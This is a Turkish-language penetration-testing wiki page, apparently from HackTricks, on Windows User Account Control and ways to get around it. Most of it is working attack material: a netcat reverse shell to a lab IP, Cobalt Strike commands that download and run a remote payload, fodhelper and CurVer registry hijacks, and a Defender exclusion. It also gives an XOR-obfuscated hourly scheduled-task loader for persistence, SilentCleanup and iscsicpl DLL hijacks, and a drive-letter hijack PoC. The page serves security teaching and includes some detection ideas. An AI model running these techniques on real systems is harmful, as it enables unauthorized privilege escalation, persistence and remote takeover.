# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), **yükseltilmiş etkinlikler için onay istemi** sağlayan bir özelliktir. Uygulamaların farklı `integrity` seviyeleri vardır ve **yüksek seviyeye** sahip bir program, **sistemi potansiyel olarak tehlikeye atabilecek** görevleri gerçekleştirebilir. UAC etkinleştirildiğinde, bir yönetici bu uygulamaların/görevlerin çalıştırılabilmesi için sisteme yönetici düzeyinde erişime sahip olmasına açıkça izin vermediği sürece, uygulamalar ve görevler her zaman **yönetici olmayan bir hesabın güvenlik bağlamı altında çalışır**. Bu, yöneticileri istenmeyen değişikliklerden koruyan bir kolaylık özelliğidir; ancak bir güvenlik sınırı olarak kabul edilmez.<sup>[[2]](#references)</sup>

integrity seviyeleri hakkında daha fazla bilgi:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC devredeyken, bir yönetici kullanıcıya 2 token verilir: normal işlemleri medium integrity seviyesinde gerçekleştirmek için standart kullanıcı token'ı ve yönetici ayrıcalıklarına sahip bir token.

Bu [sayfa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), oturum açma sürecini, kullanıcı deneyimini ve UAC mimarisini de içerecek şekilde UAC'nin nasıl çalıştığını ayrıntılı olarak açıklar.<sup>[[2]](#references)</sup> Yöneticiler, UAC'nin nasıl çalışacağını kuruluşlarına özgü olacak şekilde yerel düzeyde (secpol.msc kullanarak) yapılandırmak veya bir Active Directory domain ortamında Group Policy Objects (GPO) aracılığıyla yapılandırıp dağıtmak için security policy'leri kullanabilir. Çeşitli ayarlar [burada](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) ayrıntılı olarak ele alınmıştır. UAC için ayarlanabilen 10 Group Policy ayarı vardır. Aşağıdaki tablo ek ayrıntılar sunar:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Windows'ta yazılım yüklemeye yönelik Policies

**Local security policy'ler** (çoğu sistemde "secpol.msc"), varsayılan olarak **yönetici olmayan kullanıcıların yazılım yüklemesini önleyecek** şekilde yapılandırılır. Bu, yönetici olmayan bir kullanıcı yazılımınızın installer'ını indirebilse bile, bir admin account olmadan çalıştıramayacağı anlamına gelir.

### UAC'nin Elevation İstemesini Zorlamak için Registry Keys

Herhangi bir admin hakkı olmayan standart bir kullanıcı olarak, "standard" account belirli eylemleri gerçekleştirmeye çalıştığında **UAC tarafından credentials istenmesini** sağlayabilirsiniz. Bu işlem, belirli **registry keys** üzerinde değişiklik yapılmasını gerektirir; bunun için admin permissions gerekir. Ancak bir **UAC bypass** mevcutsa veya saldırgan zaten admin olarak oturum açmışsa bu gereklilik geçerli olmayabilir.

Kullanıcı **Administrators** grubunda olsa bile bu değişiklikler, administrative actions gerçekleştirmek için kullanıcının **account credentials bilgilerini yeniden girmesini** zorunlu kılar.

**Pratikte bu yalnızca zaten elevated token'a, bir UAC bypass'a veya bu keys'leri değiştirmenize olanak tanıyan bir misconfiguration'a sahip olduğunuzda işe yarar; aksi takdirde registry write işleminin kendisi engellenir.**

Değiştirmeniz gereken registry keys ve entries aşağıdaki gibidir (varsayılan değerleri parantez içinde verilmiştir):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Bu işlem Local Security Policy tool aracılığıyla manuel olarak da yapılabilir. Değiştirildikten sonra administrative operations, kullanıcının credentials bilgilerini yeniden girmesini ister.

### Not

**User Account Control bir security boundary değildir.** Bu nedenle standard users, local privilege escalation exploit olmadan hesaplarından çıkıp administrator hakları elde edemez.

### Bir kullanıcıdan "full computer access" istemek
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode, yüksek bütünlük düzeyindeki işlemlerin (web tarayıcıları gibi) düşük bütünlük düzeyindeki verilere (geçici Internet dosyaları klasörü gibi) erişmesini önlemek için bütünlük kontrollerini kullanır. Bu işlem, tarayıcının düşük bütünlük düzeyine sahip bir token ile çalıştırılmasıyla gerçekleştirilir. Tarayıcı düşük bütünlük bölgesinde depolanan verilere erişmeye çalıştığında işletim sistemi işlemin bütünlük düzeyini kontrol eder ve erişime buna göre izin verir. Bu özellik, remote code execution saldırılarının sistemdeki hassas verilere erişmesini önlemeye yardımcı olur.
- Bir kullanıcı Windows'ta oturum açtığında sistem, kullanıcının ayrıcalıklarının listesini içeren bir access token oluşturur. Ayrıcalıklar, kullanıcının hakları ve yeteneklerinin birleşimi olarak tanımlanır. Token ayrıca kullanıcının credentials listesini de içerir; bunlar, kullanıcının bilgisayara ve ağdaki kaynaklara kimlik doğrulaması yapması için kullanılan credentials'lardır.

### Autoadminlogon

Windows'u başlangıçta belirli bir kullanıcıyla otomatik olarak oturum açacak şekilde yapılandırmak için **`AutoAdminLogon` registry key** değerini ayarlayın. Bu, kiosk ortamları veya test amaçları için kullanışlıdır. Parolayı registry'de açığa çıkardığı için bunu yalnızca güvenli sistemlerde kullanın.

Aşağıdaki key'leri Registry Editor veya `reg add` kullanarak ayarlayın:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Normal oturum açma davranışına dönmek için `AutoAdminLogon` değerini 0 olarak ayarlayın.

## UAC bypass

> [!TIP]
> Mağdura graphical access erişiminiz varsa UAC bypass işleminin oldukça kolay olduğunu unutmayın; UAC prompt'u göründüğünde "Yes" seçeneğine tıklamanız yeterlidir.

UAC bypass şu durumda gereklidir: **UAC etkin, process'iniz medium integrity context içinde çalışıyor ve kullanıcınız administrators grubuna ait.**

UAC en yüksek security level (Always) olarak ayarlanmışsa, diğer seviyelerden (Default) herhangi birinde olduğundan **bypass edilmesinin çok daha zor** olduğunu belirtmek önemlidir.

### Medium-integrity shell'den hızlı triage

Bir bypass denemeden önce doğru senaryoda olduğunuzu doğrulayın ve host build'ini bilinen çalışan yöntemlerle eşleştirin:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Pratik notlar:
- `EnableLUA=0` ise bir bypass'a ihtiyacınız yoktur: herhangi bir admin token'ı doğrudan high integrity isteğinde bulunabilir.
- `ConsentPromptBehaviorAdmin=2` veya `5`, auto-elevate / COM-based bypasses için yaygın senaryodur.
- `Always Notify` çıtayı yükseltir, ancak başarısız olduğunu varsaymak yerine tam build'i yine de test etmelisiniz: UACME, modern Windows build'lerinde hâlâ bazı `AlwaysNotify compatible` method'larını takip eder.<sup>[[3]](#references)</sup>

### UAC disabled

UAC zaten devre dışıysa (`ConsentPromptBehaviorAdmin` **`0`**), aşağıdakine benzer bir yöntem kullanarak admin privileges ile (high integrity level) bir **reverse shell** çalıştırabilirsiniz:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### Token duplication ile UAC bypass

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Çok** Temel UAC "bypass" (tam dosya sistemi erişimi)

Administrators grubunun içinde bulunan bir kullanıcıyla bir shell'iniz varsa, SMB (dosya sistemi) üzerinden paylaşılan **C$**'ı yeni bir diske yerel olarak **mount** edebilirsiniz; böylece **dosya sistemindeki her şeye** (Administrator ana klasörü dahil) **erişiminiz** olur.

> [!WARNING]
> **Görünüşe göre bu yöntem artık çalışmıyor**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### cobalt strike ile UAC bypass

Cobalt Strike teknikleri yalnızca UAC maksimum güvenlik düzeyine ayarlanmadıysa çalışır
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** ve **Metasploit**, **UAC**'yi **bypass** etmek için çeşitli modüllere de sahiptir.

### Elevated COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)

Auto-elevated COM objects, modern build'lerde pratik bir UAC yüzeyi olmaya devam etmektedir. `ICMLuaUtil`, mevcut Windows branch'lerinde çalıştığı UACME tarafından hâlâ takip edilmektedir ve offensive tooling, COM Elevation Moniker'ı çağırmadan önce interactive desktop process, 64-bit execution ve bazen PEB/process masquerading yöntemlerini birleştirerek `CMSTPLUA`'yı uyarlamaya devam etmektedir.<sup>[[3]](#references)</sup>

Practical tips:
- Kullanıcının **interactive session**'ındaki bir **64-bit** process'i (genellikle `explorer.exe` veya onun bir child process'i) tercih edin.
- Ham bir shell başarısız olursa naif bir `CreateProcess` wrapper'ı yerine bir BOF / UACME implementation üzerinden tekrar deneyin.
- Child execution'ın **ayrı bir elevated process** içinde gerçekleşmesini bekleyin; birçok BOF mevcut beacon'ı yerinde elevate etmez.

### KRBUACBypass

Documentation and tool in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME), çeşitli UAC bypass exploit'lerinin bir **derlemesidir**. **UACME'yi Visual Studio veya msbuild kullanarak compile etmeniz** gerektiğini unutmayın. Compilation, çeşitli executable'lar (örneğin `Source\Akagi\outout\x64\Debug\Akagi.exe`) oluşturacaktır; **hangisine ihtiyacınız olduğunu bilmeniz gerekir.**<sup>[[3]](#references)</sup>\
Dikkatli **olmalısınız**, çünkü bazı bypass'ler **başka programları açarak** **kullanıcıyı** bir şeyler olduğuna dair **uyarabilir**.<sup>[[3]](#references)</sup>

UACME, her technique'in çalışmaya başladığı **build version**'ı belirtir.<sup>[[3]](#references)</sup> Sürümlerinizi etkileyen bir technique'i arayabilirsiniz:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Ayrıca [bu](https://en.wikipedia.org/wiki/Windows_10_version_history) sayfayı kullanarak derleme sürümlerinden Windows sürümünü (`1607`) elde edebilirsiniz.

Pratik bir iş akışı, önce **host derlemesini puanlamak**, ardından yalnızca eşleşen yöntemi çalıştırmaktır:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage`, yerel build'i bilinen UAC yöntemleriyle hızlıca karşılaştırır; bu, çalışmayan PoC'leri hızla elemek için kullanışlıdır.<sup>[[4]](#references)</sup>
- `UACME`, bir bypass yöntemini kesin bir build ile eşleştirmek için hâlâ en iyi public catalogue'dur. Güncel sürümler yeni yöntemler ekledi ve mevcut yöntemleri **Windows 11 25H2** üzerinde yeniden test etti; bu nedenle eski bir blog gönderisinin hâlâ değişiklik yapılmadan geçerli olduğunu varsaymadan önce README/release notes'u yeniden kontrol edin.<sup>[[3]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Güvenilir binary `fodhelper.exe`, modern Windows sürümlerinde auto-elevated durumdadır. Çalıştırıldığında, `DelegateExecute` verb'ünü doğrulamadan aşağıdaki per-user registry path'ini sorgular. Buraya bir command yerleştirmek, Administrators grubundaki bir kullanıcının Medium Integrity process'inin UAC prompt'u olmadan High Integrity process başlatmasını sağlar.

fodhelper tarafından sorgulanan Registry path:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell adımları (payload'unuzu ayarlayın, ardından tetikleyin)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notlar:
- Geçerli kullanıcı Administrators üyesi olduğunda ve UAC seviyesi varsayılan/gevşek olduğunda çalışır (ek kısıtlamalarla Always Notify değil).
- 64-bit Windows üzerinde 32-bit bir process'ten 64-bit PowerShell başlatmak için `sysnative` path'ini kullanın.
- Payload herhangi bir command olabilir (PowerShell, cmd veya bir EXE path'i). Gizlilik için kullanıcı arayüzü gösteren istemlerden kaçının.

#### CurVer/extension hijack varyantı (yalnızca HKCU)

`fodhelper.exe` dosyasını abuse eden güncel örnekler `DelegateExecute` kullanmaktan kaçınır ve bunun yerine per-user `CurVer` value'su üzerinden **`ms-settings` ProgID'sini redirect eder**. Auto-elevated binary hâlâ handler'ı `HKCU` altında resolve ettiğinden, key'leri yerleştirmek için admin token gerekmez:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Yetki yükseltildikten sonra malware, `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` değerini `0` olarak ayarlayarak **gelecekteki istemleri devre dışı bırakır**; ardından ek defense evasion işlemleri gerçekleştirir (ör. `Add-MpPreference -ExclusionPath C:\ProgramData`) ve yüksek bütünlük düzeyinde çalışmak üzere persistence'ı yeniden oluşturur. Tipik bir persistence görevi, diskte **XOR-encrypted bir PowerShell scripti** saklar ve bunu her saat bellekte decode edip çalıştırır:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Bu varyant yine dropper'ı temizler ve yalnızca staged payload'ları bırakır; bu nedenle detection, **`CurVer` hijack**, `ConsentPromptBehaviorAdmin` tampering, Defender exclusion oluşturulması veya PowerShell'i bellekte decrypt eden scheduled task'lerin izlenmesine dayanır.<sup>[[5]](#references)</sup>

### `SilentCleanup` task üzerinden UAC bypass (`HKCU\Environment\windir`)

`SilentCleanup`, `cleanmgr.exe`'yi en yüksek ayrıcalıklarla başlatır ve `%windir%` değerini kullanıcının environment'ından genişletir. `HKCU\Environment\windir` değerini kontrol ediyorsanız, bu genişletmeyi rastgele bir command'e yönlendirebilir ve consent dialog olmadan yüksek bütünlük elde edebilirsiniz.<sup>[[8]](#references)</sup> UACME bu tekniği etkin tutmaya devam ettiğinden ve güncel issue tracking sonuçları Windows 11 24H2'nin yalnızca küçük quoting adjustments gerektirebileceğini gösterdiğinden, bu yöntem güncel build'lerde hâlâ test edilmeye değerdir.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Derleme üzerindeki görev yolu tırnak içine alıyorsa payload'u tırnakla bitecek şekilde yeniden deneyin (örneğin `cmd.exe"`). Testten sonra `HKCU\Environment\windir` değerini her zaman temizleyin.

#### Daha fazla UAC bypass

UI akışlarını, COM nesnelerini veya masaüstü etkileşimini kötüye kullanan birçok klasik UAC bypass tekniği, kurbanla **tam etkileşimli bir oturum** gerektirir; sıradan bir `nc.exe` shell'i veya **Session 0** içinde çalışan bir servis çoğu zaman yeterli değildir.

Bunu genellikle bir **meterpreter** oturumu kullanarak çözebilirsiniz. **Session** değeri **1** olan bir **process**'e migrate edin:

![ms-settings'i özel bir uzantıya (.thm) yönlendirin ve bu uzantıyı payload'umuza eşleyin - Daha fazla UAC bypass: Bir meterpreter oturumu kullanarak edinebilirsiniz. Session... değeri olan bir process'e migrate edin...](<../../images/image (863).png>)

(_explorer.exe_ çalışmalıdır)

### GUI ile UAC Bypass

Bir **GUI** erişiminiz varsa, UAC istemi göründüğünde **onaylayabilirsiniz**; teknik bir bypass'a gerçekten ihtiyacınız yoktur. Bu nedenle bir GUI oturumu elde etmek, UAC'nin eklediği pratik engeli aşmak için genellikle yeterlidir.

Ayrıca birinin kullandığı (muhtemelen RDP üzerinden) bir GUI oturumu elde ederseniz, buradan doğrudan yeniden UAC istemi gösterilmeden **admin olarak bir cmd** örneğin **çalıştırabileceğiniz**, **administrator olarak çalışan bazı araçlar** bulunabilir; örneğin [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Bu biraz daha **stealthy** olabilir.

### Gürültülü brute-force UAC bypass

Gürültülü olmaktan çekinmiyorsanız, her zaman [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) gibi bir şeyi **çalıştırabilirsiniz**; bu araç **kullanıcı kabul edene kadar izinleri yükseltmesini ister**.

### Kendi bypass'ınız - Temel UAC bypass metodolojisi

**UACME**'ye göz atarsanız, **birçok UAC bypass tekniğinin DLL hijacking'i kötüye kullandığını** (genellikle elevated bir binary'ye yazılabilir bir path'ten saldırgan kontrollü bir DLL yükleterek) fark edersiniz. Bir DLL hijacking zafiyetinin nasıl bulunacağını öğrenmek için [bunu okuyun](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. **autoelevate** olacak bir binary bulun (çalıştırıldığında high integrity level'da çalıştığını kontrol edin).
2. Procmon ile **DLL Hijacking** için zafiyetli olabilecek "**NAME NOT FOUND**" event'lerini bulun.
3. DLL'i bazı **protected path'lerin** (C:\Windows\System32 gibi) içine **yazmanız** gerekebilir; buralarda yazma izniniz yoktur. Bunu şu yöntemlerle aşabilirsiniz:
1. **wusa.exe**: Windows 7,8 ve 8.1. Bu araç high integrity level'da çalıştırıldığı için bir CAB file'ın içeriğini protected path'lerin içine çıkarmanıza izin verir.
2. **IFileOperation**: Windows 10.
4. DLL'inizi protected path'in içine kopyalayacak ve zafiyetli, autoelevated binary'yi çalıştıracak bir **script** hazırlayın.

### Başka bir UAC bypass tekniği

Bir **autoElevated binary**'nin çalıştırılacak bir **binary** veya **command**'in **name/path** bilgisini **registry**'den **okumaya** çalışıp çalışmadığını izlemekten oluşur (binary bu bilgiyi **HKCU** içinde arıyorsa daha ilginçtir).

### `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack ile UAC bypass

32-bit `C:\Windows\SysWOW64\iscsicpl.exe`, search order kullanarak `iscsiexe.dll` yüklemesi için kötüye kullanılabilecek bir **auto-elevated** binary'dir. Kötü amaçlı bir `iscsiexe.dll` dosyasını **user-writable** bir klasöre yerleştirebilir ve ardından mevcut user `PATH`'ini (örneğin `HKCU\Environment\Path` üzerinden) bu klasör aranacak şekilde değiştirebilirseniz Windows, **UAC prompt göstermeden** saldırgan DLL'ini elevated `iscsicpl.exe` process'i içinde yükleyebilir.<sup>[[1]](#references)[[6]](#references)</sup>

Pratik notlar:
- Bu, mevcut user **Administrators** grubundaysa ancak UAC nedeniyle **Medium Integrity** seviyesinde çalışıyorsa kullanışlıdır.
- Bu bypass için ilgili olan kopya **SysWOW64** kopyasıdır. **System32** kopyasını ayrı bir binary olarak ele alın ve davranışını bağımsız olarak doğrulayın.
- Primitive, **auto-elevation** ile **DLL search-order hijacking** birleşimidir; bu nedenle diğer UAC bypass'larında kullanılan ProcMon workflow'u, eksik DLL yüklemesini doğrulamak için de yararlıdır.

Minimal akış:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Detection ideas:
- `reg add` / `HKCU\Environment\Path` kayıt defteri yazımlarının hemen ardından `C:\Windows\SysWOW64\iscsicpl.exe` çalıştırılması durumunda uyarı oluşturun.
- `%TEMP%` veya `%LOCALAPPDATA%\Microsoft\WindowsApps` gibi **kullanıcı kontrollü** konumlarda `iscsiexe.dll` arayın.
- `iscsicpl.exe` başlatmalarını, normal Windows dizinleri dışından gelen beklenmeyen child process'ler veya DLL yüklemeleriyle ilişkilendirin.

### Ayrı olarak incelenmeye değer newer research

2024 sonrası bazı chain'ler artık klasik `HKCU\Software\Classes` registry hijack'lerine benzemiyor. Örneğin activation-context cache poisoning; bir **drive remap** ve **DLL redirection** işlemini chain'leyerek `ctfmon.exe` gibi trusted UI / auto-elevated binary'ler ve daha sonra `fodhelper.exe` gibi target'lar üzerinden medium integrity'den high integrity'ye geçiş sağlayabilir. Büyük PoC'yi burada tekrarlamak yerine şu konumdaki compact payload örneklerini inceleyin:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (25H2) per-logon-session DOS device map üzerinden drive-letter hijack

Windows 11 25H2'deki tüm `RAiLaunchAdminProcess` / UIAccess attack surface için özel sayfayı inceleyin:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 “Administrator Protection”, per-session `\Sessions\0\DosDevices/<LUID>` map'lerine sahip shadow-admin token'ları kullanır. Dizin, ilk `\??` resolution işleminde `SeGetTokenDeviceMap` tarafından lazy olarak oluşturulur. Saldırgan shadow-admin token'ını yalnızca **SecurityIdentification** seviyesinde impersonate ederse dizin, saldırganın **owner** olarak ( `CREATOR OWNER` öğesini inherit ederek) oluşturulur ve bu sayede `\GLOBAL??` üzerinde öncelik kazanan drive-letter link'leri oluşturulabilir.<sup>[[7]](#references)</sup>

**Steps:**

1. Low-privileged bir session'dan, prompt'suz bir shadow-admin `runonce.exe` başlatmak için `RAiProcessRunOnce` çağırın.
2. Primary token'ını bir **identification** token'ına duplicate edin ve `\Sessions\0\DosDevices/<LUID>` dizininin attacker ownership altında oluşturulmasını zorlamak için `\??` açılırken bu token'ı impersonate edin.
3. Burada attacker-controlled storage'a işaret eden bir `C:` symlink'i oluşturun; bu session'daki sonraki filesystem access işlemleri `C:` yolunu attacker path'ine resolve eder ve prompt olmadan DLL/file hijack yapılmasını sağlar.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Referanslar

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Kullanıcı Hesabı Denetimi nasıl çalışır](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – UAC bypass teknikleri derlemesi](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – UAC bypass uyumluluk tarayıcısı ve başlatıcısı](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI, PowerShell Backdoor'ları oluşturmak için AI'ı benimsiyor](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
